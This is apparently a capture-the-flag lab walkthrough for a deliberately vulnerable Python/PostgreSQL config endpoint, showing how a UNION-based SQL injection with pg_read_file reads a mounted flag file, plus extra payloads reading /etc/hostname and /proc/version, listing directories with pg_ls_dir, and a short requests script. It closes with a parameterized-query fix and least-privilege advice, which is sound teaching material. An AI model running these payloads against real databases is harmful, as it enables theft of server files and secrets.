# Level 3-3: File Read via pg_read_file

**URL:** `/secrets`

**Objective:** Read a Docker-mounted secret file (`/secrets/flag.txt`) from the PostgreSQL server's filesystem using `pg_read_file`, injected via a UNION into a config viewer endpoint.

## Vulnerable Code

```python
query = f"SELECT valor FROM configuracoes WHERE secao = '{section}'"
cur.execute(query)
row = cur.fetchone()
```

The `section` parameter is interpolated directly into a single-quoted string context. The DB user is a PostgreSQL SUPERUSER.

## Why pg_read_file Works Here

`pg_read_file(path)` is a PostgreSQL built-in that reads a file on the **database server's** filesystem and returns its contents as text. In PostgreSQL 14+, superusers can read files at arbitrary absolute paths (not limited to the data directory). This makes it a powerful post-exploitation primitive: any SQL injection running as superuser can pivot to filesystem access.

The flag file is mounted into the postgres container at `/secrets/flag.txt` via a Docker bind mount.

## Attack Chain

### Step 1 — Confirm injection

```
section=db_version
```

Returns `PostgreSQL 16`. Normal operation.

```
section=db_version'--
```

Observe whether the trailing `'` causes an error or changes the result. If the error message is visible, injection is confirmed.

### Step 2 — Determine column count

The `configuracoes` table has 2 columns (`secao`, `valor`). The SELECT returns 1 column (`valor`). UNION requires matching column count.

```sql
' UNION SELECT NULL--
```

No error → UNION with 1 column works.

### Step 3 — Read the flag file

```
section=' UNION SELECT pg_read_file('/secrets/flag.txt')--
```

Full query after injection:

```sql
SELECT valor FROM configuracoes WHERE secao = '' UNION SELECT pg_read_file('/secrets/flag.txt')--'
```

`secao = ''` matches no config rows. The UNION appends the file contents as `valor`. The response:

```json
{"valor": "JUMENTOS{f1l3_r34d_pwn3d}"}
```

The congratulations banner appears automatically when `JUMENTOS{` is detected in the response.

### Exploring further

Since `pg_read_file` can read any file accessible to the `postgres` OS user, you can enumerate the server's configuration:

```sql
' UNION SELECT pg_read_file('/etc/hostname')--
' UNION SELECT pg_read_file('/proc/version')--
```

You can also list directory contents with `pg_ls_dir`:

```sql
' UNION SELECT string_agg(filename, ', ') FROM pg_ls_dir('/secrets') AS t(filename)--
```

### Example automation script

File available at: `backend/scripts/script-3_3.py`

```python
import requests

payload = "' UNION SELECT pg_read_file('/secrets/flag.txt')--"
r = requests.get('http://localhost/api/config', params={'section': payload})
print(r.json())
```

Output:

```json
{"valor": "JUMENTOS{f1l3_r34d_pwn3d}"}
```

## Fixed Code

```python
query = "SELECT valor FROM configuracoes WHERE secao = %s"
cur.execute(query, (section,))
```

Additionally, do not grant SUPERUSER to application database accounts. Use a least-privilege role with `SELECT` only on the tables the application needs. Without superuser, `pg_read_file` is restricted to the `pg_read_server_files` role members and is not available to regular users.
